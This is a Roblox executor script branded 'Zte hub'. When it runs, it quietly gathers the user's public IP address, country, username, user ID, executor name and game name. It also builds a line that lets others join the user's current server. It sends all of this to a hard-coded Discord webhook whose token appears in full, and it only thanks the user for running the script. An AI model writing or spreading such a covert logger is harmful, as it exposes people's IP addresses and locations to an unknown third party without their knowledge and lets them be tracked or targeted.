local Http               = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local WebhookUrl         = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
local executor           = identifyexecutor() or "Unknown"

-- Debuggable IP info fetch
local function getIPInfo()
    -- First attempt: simple GetAsync
    local ok1, res1 = pcall(function()
        return Http:GetAsync("https://api.myip.com/")
    end)

    if not ok1 then
        warn("[getIPInfo] GetAsync failed:", res1)
    else
        -- Try decoding the JSON
        local data
        local okDecode, decodeErr = pcall(function()
            data = Http:JSONDecode(res1)
        end)
        if not okDecode then
            warn("[getIPInfo] JSONDecode failed:", decodeErr)
        elseif type(data) == "table" and data.country and data.cc and data.ip then
            return data.country, data.cc, data.ip
        else
            warn("[getIPInfo] GetAsync response missing fields:", res1)
        end
    end

    -- Fallback: try RequestAsync if GetAsync didnâ€™t work
    local requestParams = {
        Url     = "https://api.myip.com/",
        Method  = "GET",
        Headers = { ["User-Agent"] = "Roblox" }
    }
    local ok2, res2 = pcall(function()
        return Http:RequestAsync(requestParams)
    end)

    if not ok2 then
        warn("[getIPInfo] RequestAsync failed:", res2)
        return "Unknown", "UNK", "Unknown"
    end

    if res2.Success and res2.Body then
        local data2
        local okDecode2, decodeErr2 = pcall(function()
            data2 = Http:JSONDecode(res2.Body)
        end)
        if not okDecode2 then
            warn("[getIPInfo] JSONDecode (RequestAsync) failed:", decodeErr2)
            return "Unknown", "UNK", "Unknown"
        end

        if data2 and data2.country and data2.cc and data2.ip then
            return data2.country, data2.cc, data2.ip
        else
            warn("[getIPInfo] RequestAsync response missing fields:", res2.Body)
            return "Unknown", "UNK", "Unknown"
        end
    else
        warn(("[getIPInfo] HTTP error (RequestAsync): %s %s")
            :format(tostring(res2.StatusCode), tostring(res2.StatusMessage)))
        return "Unknown", "UNK", "Unknown"
    end
end

-- (rest of your script follows unchanged)
local function getGameName()
    local placeId = game.PlaceId
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(placeId)
    end)
    if success and placeInfo and placeInfo.Name then
        return placeInfo.Name
    else
        return "Unknown Game"
    end
end

local function sendRequest()
    local player      = game.Players.LocalPlayer
    local displayName = player and player.DisplayName or "N/A"
    local userName    = player and player.Name or "Unknown"
    local playerId    = player and player.UserId or 0

    local placeId = tostring(game.PlaceId)
    local jobId   = tostring(game.JobId)
    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
                       placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"

    local country, cc, ip = getIPInfo()
    local gameName       = getGameName()

    local payload = {
        content = "**Thanks for using the script!**",
        embeds = {
            {
                author = { name = "Zte hub Server" },
                title  = userName .. " | " .. displayName,
                type   = "rich",
                color  = tonumber(0x00FF00),
                thumbnail = {
                    url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
                          "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
                },
                fields = {
                    { name = "Executor",     value = executor, inline = true  },
                    { name = "Country",      value = country,  inline = true  },
                    { name = "Country Code", value = cc,       inline = true  },
                    { name = "IP Address",   value = ip,       inline = true  },
                    { name = "Game Name",    value = gameName, inline = false },
                },
            },
            {
                title       = "Join Server Script",
                description = "\n```lua\n" .. joinScript .. "\n```\n",
                color       = tonumber(0x00FF00),
            }
        }
    }

    return {
        Url     = WebhookUrl,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = Http:JSONEncode(payload)
    }
end

if syn then
    syn.request(sendRequest())
else
    local requestFunction = http_request or request or HttpPost or (syn and syn.request)
    requestFunction(sendRequest())
end
